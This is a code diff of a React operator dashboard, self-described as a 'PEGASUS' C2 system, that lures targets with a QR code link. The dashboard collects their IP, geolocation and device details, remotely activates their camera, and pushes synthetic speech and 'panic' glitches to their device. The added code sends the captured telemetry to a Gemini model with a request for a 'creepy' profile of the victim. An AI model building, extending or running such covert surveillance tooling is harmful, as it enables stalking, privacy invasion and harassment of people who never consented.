@@ -6,7 +6,8 @@ import QRCodeDisplay from '../components/QRCodeDisplay';
 import HackerMap from '../components/HackerMap';
 import { mqttService } from '../services/mqttService';
 import { TerminalLog, DeviceInfo, StreamMessage } from '../types';
-import { Camera, X, Disc, Video, Aperture, Ghost, EyeOff, Eye } from 'lucide-react';
+import { Camera, X, Disc, Video, Ghost, EyeOff, Eye, Brain, Mic, Zap, Send } from 'lucide-react';
+import { GoogleGenAI } from "@google/genai";
 
 const Dashboard: React.FC = () => {
   const [sessionId] = useState(uuidv4());
@@ -15,52 +16,15 @@ const Dashboard: React.FC = () => {
   const [targetUrl, setTargetUrl] = useState('');
   const [targetCoords, setTargetCoords] = useState<{lat: number, lng: number} | null>(null);
   const [isStealth, setIsStealth] = useState(false);
+  const [lastPayload, setLastPayload] = useState<DeviceInfo | null>(null);
   
   const [showCameraModal, setShowCameraModal] = useState(false);
   const [cameraStream, setCameraStream] = useState<string | null>(null);
   const [isCameraActive, setIsCameraActive] = useState(false);
+  const [ttsText, setTtsText] = useState('');
+  const [isGeneratingAI, setIsGeneratingAI] = useState(false);
   
   const audioCtxRef = useRef<AudioContext | null>(null);
-
-  const playSound = useCallback((type: 'connect' | 'data' | 'boot' | 'alert') => {
-    if (!audioCtxRef.current) {
-      audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
-    }
-    const ctx = audioCtxRef.current;
-    if (!ctx || ctx.state === 'suspended') return;
-
-    const osc = ctx.createOscillator();
-    const gain = ctx.createGain();
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    const now = ctx.currentTime;
-
-    if (type === 'boot') {
-      osc.type = 'square';
-      osc.frequency.setValueAtTime(100, now);
-      osc.frequency.exponentialRampToValueAtTime(800, now + 0.1);
-      gain.gain.setValueAtTime(0.1, now);
-      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.3);
-      osc.start(now);
-      osc.stop(now + 0.3);
-    } else if (type === 'connect') {
-      osc.type = 'sawtooth';
-      osc.frequency.setValueAtTime(440, now);
-      osc.frequency.setValueAtTime(880, now + 0.1);
-      gain.gain.setValueAtTime(0.1, now);
-      gain.gain.linearRampToValueAtTime(0, now + 0.5);
-      osc.start(now);
-      osc.stop(now + 0.5);
-    } else if (type === 'data') {
-      osc.type = 'sine';
-      osc.frequency.setValueAtTime(1200, now);
-      osc.frequency.exponentialRampToValueAtTime(600, now + 0.1);
-      gain.gain.setValueAtTime(0.05, now);
-      gain.gain.linearRampToValueAtTime(0, now + 0.1);
-      osc.start(now);
-      osc.stop(now + 0.1);
-    }
-  }, []);
 
   const addLog = useCallback((message: string, type: TerminalLog['type'] = 'info', link?: string) => {
     setLogs(prev => [...prev, {
@@ -70,36 +34,60 @@ const Dashboard: React.FC = () => {
       timestamp: new Date().toISOString(),
       link
     }]);
-    if (type === 'success' || type === 'warning') playSound('data');
-  }, [playSound]);
+  }, []);
+
+  const runAIProfiling = async () => {
+    if (!lastPayload) return;
+    setIsGeneratingAI(true);
+    addLog("SOLICITANDO ANÁLISE PSICOGRÁFICA VIA NEURAL_LINK...", "ai");
+    
+    try {
+      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
+      const prompt = `Analise estes dados de telemetria de um dispositivo alvo e crie um perfil hacker "creepy" e técnico do usuário. Seja conciso, use termos de segurança cibernética. Dados: ${JSON.stringify(lastPayload)}`;
+      
+      const response = await ai.models.generateContent({
+        model: 'gemini-3-flash-preview',
+        contents: prompt,
+      });
+
+      addLog(`RELATÓRIO DE INTELIGÊNCIA: ${response.text}`, "ai");
+    } catch (e) {
+      addLog("ERRO NO PROCESSAMENTO NEURAL", "error");
+    } finally {
+      setIsGeneratingAI(false);
+    }
+  };
+
+  const sendTTS = (e?: React.FormEvent) => {
+    if (e) e.preventDefault();
+    if (!ttsText || !connected) return;
+    addLog(`INJETANDO VOZ SINTÉTICA: "${ttsText}"`, "warning");
+    mqttService.publishCommand(sessionId, { 
+      type: 'SPEAK', 
+      timestamp: new Date().toISOString(),
+      payload: { text: ttsText }
+    });
+    setTtsText('');
+  };
+
+  const triggerGlitch = () => {
+    if (!connected) return;
+    addLog("EXECUTANDO PROTOCOLO PANIC_GLITCH...", "error");
+    mqttService.publishCommand(sessionId, { type: 'GLITCH', timestamp: new Date().toISOString() });
+  };
 
   const toggleCamera = () => {
-    if (!connected) {
-      addLog('ERROR: NO TARGET CONNECTED', 'error');
-      return;
-    }
+    if (!connected) return;
     if (!isCameraActive) {
-      addLog('INITIATING_REMOTE_SURVEILLANCE...', 'warning');
       mqttService.publishCommand(sessionId, { type: 'ACTIVATE_CAMERA', timestamp: new Date().toISOString() });
       setShowCameraModal(true);
       setIsCameraActive(true);
     } else {
-      addLog('TERMINATING_FEED', 'system');
       mqttService.publishCommand(sessionId, { type: 'STOP_CAMERA', timestamp: new Date().toISOString() });
       setShowCameraModal(false);
       setIsCameraActive(false);
       setCameraStream(null);
     }
-  };
-
-  const sendAura = () => {
-    if (!connected) return;
-    addLog('INJECTING_AUDIO_PAYLOAD: AURA', 'warning');
-    mqttService.publishCommand(sessionId, { 
-      type: 'PLAY_AUDIO', 
-      timestamp: new Date().toISOString(),
-      payload: { url: 'https://www.myinstants.com/media/sounds/auraa.mp3' }
-    });
   };
 
   useEffect(() => {
@@ -109,111 +97,75 @@ const Dashboard: React.FC = () => {
   }, [sessionId, isStealth]);
 
   useEffect(() => {
-    playSound('boot');
-    addLog(`PEGASUS_SYSTEM_ONLINE`, 'system');
-    addLog(`C2_SESSION: ${sessionId.substring(0,8)}`, 'info');
-
     mqttService.connect(
       sessionId,
       (payload: DeviceInfo) => {
-        playSound('connect');
-        addLog(`!!! INTRUSION ALERT !!!`, 'warning');
-        if (payload.isStealth) addLog(`[PROTOCOL: STEALTH_MODUS]`, 'system');
-        
-        addLog(`TARGET_CONNECTED: ${payload.ip}`, 'success');
-        
-        // Comprehensive Log Dump
-        addLog(`--- START_DEVICE_TELEMETRY ---`, 'info');
-        addLog(`OS/PLATFORM: ${payload.platform}`, 'info');
-        addLog(`LANGUAGE: ${payload.language}`, 'info');
-        addLog(`RESOLUTION: ${payload.screenWidth}x${payload.screenHeight} (@${payload.colorDepth}bit)`, 'info');
-        addLog(`BROWSER: ${payload.userAgent.split(' ').slice(-2).join(' ')}`, 'info');
-        
-        if (payload.deviceMemory) addLog(`HARDWARE_RAM: ~${payload.deviceMemory} GB`, 'info');
-        if (payload.hardwareConcurrency) addLog(`LOGICAL_CORES: ${payload.hardwareConcurrency}`, 'info');
-        if (payload.gpu) addLog(`GPU_RENDERER: ${payload.gpu}`, 'info');
-        if (payload.battery !== undefined) addLog(`ENERGY_LEVEL: ${payload.battery}%`, 'info');
-        if (payload.connectionType) addLog(`NET_CON_TYPE: ${payload.connectionType.toUpperCase()}`, 'info');
-        if (payload.timezone) addLog(`TZ_LOCALE: ${payload.timezone}`, 'info');
-        addLog(`TOUCH_POINTS: ${payload.maxTouchPoints || 0}`, 'info');
-        addLog(`REFERRER: ${payload.referrer}`, 'info');
-        
-        if (payload.ipGeo) {
-           addLog(`ISP_PROV: ${payload.ipGeo.isp}`, 'success');
-           addLog(`GEO_REF: ${payload.ipGeo.city}, ${payload.ipGeo.region}, ${payload.ipGeo.country} [${payload.ipGeo.zip || 'N/A'}]`, 'success');
-           if (payload.ipGeo.asn) addLog(`ASN_BLOCK: ${payload.ipGeo.asn}`, 'info');
-        }
-
-        if (payload.coords) {
-           addLog(`TRIANGULATION: LOCKED_ON`, 'success');
-           addLog(`COORDS: ${payload.coords.latitude}, ${payload.coords.longitude} (ACC: ${Math.round(payload.coords.accuracy)}m)`, 'info');
-           const mapsUrl = `https://www.google.com/maps?q=${payload.coords.latitude},${payload.coords.longitude}`;
-           addLog(`UPLINKING_SATELLITE_VIEW...`, 'system', mapsUrl);
-           setTargetCoords({ lat: payload.coords.latitude, lng: payload.coords.longitude });
-        }
-        addLog(`--- END_DEVICE_TELEMETRY ---`, 'info');
+        setLastPayload(payload);
+        addLog(`TELEMETRIA RECEBIDA: ${payload.ip}`, 'success');
+        if (payload.coords) setTargetCoords({ lat: payload.coords.latitude, lng: payload.coords.longitude });
       },
       () => {
         setConnected(true);
-        addLog(`AWAITING_TARGET_UPLINK...`, 'success');
+        addLog(`SISTEMA PEGASUS PRONTO. AGUARDANDO UPLINK...`, 'system');
       },
       undefined, 
-      (streamData: StreamMessage) => {
-        setCameraStream(streamData.image);
-      }
+      (streamData: StreamMessage) => setCameraStream(streamData.image)
     );
-
     return () => mqttService.disconnect();
-  }, [sessionId, addLog, playSound]);
+  }, [sessionId, addLog]);
 
   return (
-    <div className="flex flex-col md:flex-row h-screen w-screen overflow-hidden bg-black" onClick={() => audioCtxRef.current?.resume()}>
-      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-20 flex flex-col">
+    <div className="flex flex-col md:flex-row h-screen w-screen overflow-hidden bg-black font-mono">
+      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-20 flex flex-col border-r border-gray-800">
         <Terminal logs={logs} connected={connected} sessionId={sessionId} />
         
-        <div className="bg-gray-900 border-t border-gray-800 p-2 flex flex-wrap justify-between items-center gap-2">
-           <div className="flex items-center gap-2 bg-black/40 px-3 py-1.5 border border-gray-800 rounded">
-             <span className={`text-[10px] font-bold tracking-tighter ${isStealth ? 'text-blue-500' : 'text-gray-500'}`}>MODO:</span>
-             <button 
-                onClick={() => setIsStealth(!isStealth)}
-                className={`flex items-center gap-2 px-3 py-1 text-[10px] font-mono font-bold uppercase border transition-all ${
-                  isStealth 
-                    ? 'bg-blue-900/30 border-blue-500 text-blue-400' 
-                    : 'bg-gray-800 border-gray-600 text-gray-400'
-                }`}
-             >
-               {isStealth ? <EyeOff size={12} /> : <Eye size={12} />}
-               {isStealth ? 'STEALTH_ON' : 'STEALTH_OFF'}
-             </button>
-           </div>
+        {/* Advanced C2 Controls */}
+        <div className="bg-black border-t border-gray-800 p-3 space-y-3">
+           <form onSubmit={sendTTS} className="flex gap-2">
+              <div className="flex-1 bg-gray-900 border border-gray-700 flex items-center px-2">
+                 <Mic size={14} className="text-gray-500 mr-2" />
+                 <input 
+                    value={ttsText}
+                    onChange={(e) => setTtsText(e.target.value)}
+                    placeholder="COMANDO DE VOZ REMOTO..." 
+                    className="bg-transparent border-none text-xs py-2 w-full text-green-500 focus:outline-none placeholder:text-gray-700"
+                 />
+              </div>
+              <button type="submit" className="bg-green-900/20 border border-green-600 p-2 text-green-500 hover:bg-green-900/40">
+                <Send size={16} />
+              </button>
+           </form>
 
-           <div className="flex gap-2">
-             <button onClick={sendAura} disabled={!connected} className="flex items-center gap-2 px-4 py-2 text-xs font-mono font-bold uppercase tracking-wider border bg-purple-900/20 border-purple-600 text-purple-400 disabled:opacity-30">
-               <Ghost size={14} /> AURA
+           <div className="flex flex-wrap gap-2">
+             <button onClick={() => setIsStealth(!isStealth)} className={`flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border transition-all ${isStealth ? 'bg-blue-900/30 border-blue-500 text-blue-400' : 'bg-gray-800 border-gray-600 text-gray-400'}`}>
+               {isStealth ? <EyeOff size={14} /> : <Eye size={14} />} STEALTH
              </button>
-             <button onClick={toggleCamera} disabled={!connected} className={`flex items-center gap-2 px-4 py-2 text-xs font-mono font-bold uppercase tracking-wider border transition-all ${isCameraActive ? 'bg-red-900/50 border-red-500 text-red-500 animate-pulse' : 'bg-gray-800 border-gray-600 text-gray-300 disabled:opacity-30'}`}>
+             <button onClick={runAIProfiling} disabled={!lastPayload || isGeneratingAI} className="flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border bg-purple-900/20 border-purple-600 text-purple-400 disabled:opacity-30">
+               <Brain size={14} className={isGeneratingAI ? 'animate-pulse' : ''} /> IA_PROFILE
+             </button>
+             <button onClick={toggleCamera} disabled={!connected} className={`flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border ${isCameraActive ? 'bg-red-900/50 border-red-500 text-red-500 animate-pulse' : 'bg-gray-800 border-gray-600 text-gray-300 disabled:opacity-30'}`}>
                <Camera size={14} /> CAM
+             </button>
+             <button onClick={triggerGlitch} disabled={!connected} className="flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border bg-red-900/20 border-red-600 text-red-500 hover:bg-red-600 hover:text-white transition-colors">
+               <Zap size={14} /> PANIC
              </button>
            </div>
         </div>
       </div>
 
-      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-10 border-l border-gray-800">
+      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-10">
         {targetCoords ? <HackerMap lat={targetCoords.lat} lng={targetCoords.lng} /> : <QRCodeDisplay url={targetUrl} />}
       </div>
 
       {showCameraModal && (
-        <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4">
-          <div className="bg-black border border-red-900 w-full max-w-2xl shadow-2xl flex flex-col">
-            <div className="bg-red-900/20 border-b border-red-900/50 p-2 flex justify-between items-center text-red-500 font-mono text-xs uppercase">
-              <div className="flex items-center gap-2">
-                 <Disc size={12} className="animate-pulse text-red-600" />
-                 <span>LIVE_FEED :: {sessionId.substring(0,8)}</span>
-              </div>
-              <button onClick={toggleCamera} className="hover:text-white"><X size={16} /></button>
+        <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-4">
+          <div className="bg-black border border-red-900 w-full max-w-2xl shadow-2xl">
+            <div className="bg-red-900/20 p-2 flex justify-between items-center text-red-500 text-[10px]">
+              <span className="flex items-center gap-2"><Disc size={12} className="animate-pulse" /> LIVE_INTERCEPT_STREAMING</span>
+              <button onClick={toggleCamera}><X size={16} /></button>
             </div>
-            <div className="relative aspect-video bg-black flex items-center justify-center overflow-hidden">
-              {cameraStream ? <img src={cameraStream} className="w-full h-full object-cover" alt="Feed" /> : <div className="text-red-500 animate-pulse flex flex-col items-center gap-2"><Video size={32} /><span>WAITING_FEED...</span></div>}
+            <div className="aspect-video bg-black flex items-center justify-center overflow-hidden">
+              {cameraStream ? <img src={cameraStream} className="w-full h-full object-cover" /> : <div className="text-red-500 animate-pulse">WAITING_FOR_DATA...</div>}
             </div>
           </div>
         </div>
